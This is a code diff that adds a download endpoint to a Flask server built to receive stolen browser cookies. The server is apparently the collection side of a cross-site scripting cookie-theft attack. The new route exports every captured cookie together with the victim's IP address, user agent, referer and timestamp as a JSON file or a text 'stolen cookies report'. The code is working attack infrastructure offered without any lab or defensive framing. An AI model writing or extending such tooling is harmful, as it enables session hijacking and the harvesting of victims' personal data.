@@ -83,5 +83,64 @@ def clear_cookies():
     print("\n[INFO] All stolen cookies cleared\n")
     return jsonify({'status': 'cleared'})
 
+
+@app.route('/download/<format>', methods=['GET'])
+def download_cookies(format):
+    """Download stolen cookies in specified format (json or txt)"""
+    from flask import Response
+    
+    if format == 'json':
+        # Export as JSON
+        json_data = json.dumps({
+            'server_start': SERVER_START_TIME,
+            'total_cookies': len(stolen_cookies),
+            'cookies': stolen_cookies
+        }, indent=2, ensure_ascii=False)
+        
+        return Response(
+            json_data,
+            mimetype='application/json',
+            headers={
+                'Content-Disposition': f'attachment; filename=stolen_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
+            }
+        )
+    
+    elif format == 'txt':
+        # Export as TXT
+        txt_lines = []
+        txt_lines.append("="*70)
+        txt_lines.append("STOLEN COOKIES REPORT")
+        txt_lines.append("="*70)
+        txt_lines.append(f"Server Start Time: {SERVER_START_TIME}")
+        txt_lines.append(f"Total Cookies Stolen: {len(stolen_cookies)}")
+        txt_lines.append(f"Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        txt_lines.append("="*70)
+        txt_lines.append("")
+        
+        for idx, entry in enumerate(stolen_cookies, 1):
+            txt_lines.append(f"\n[{idx}] Cookie Entry")
+            txt_lines.append("-"*70)
+            txt_lines.append(f"Timestamp: {entry['timestamp']}")
+            txt_lines.append(f"Cookie: {entry['cookie']}")
+            txt_lines.append(f"IP Address: {entry['ip']}")
+            txt_lines.append(f"User-Agent: {entry['user_agent']}")
+            txt_lines.append(f"Referer: {entry.get('referer', 'N/A')}")
+            txt_lines.append(f"Method: {entry['method']}")
+            txt_lines.append("-"*70)
+        
+        txt_content = "\n".join(txt_lines)
+        
+        return Response(
+            txt_content,
+            mimetype='text/plain',
+            headers={
+                'Content-Disposition': f'attachment; filename=stolen_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
+            }
+        )
+    
+    else:
+        return jsonify({'error': 'Invalid format. Use json or txt'}), 400
+
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8888, debug=False)
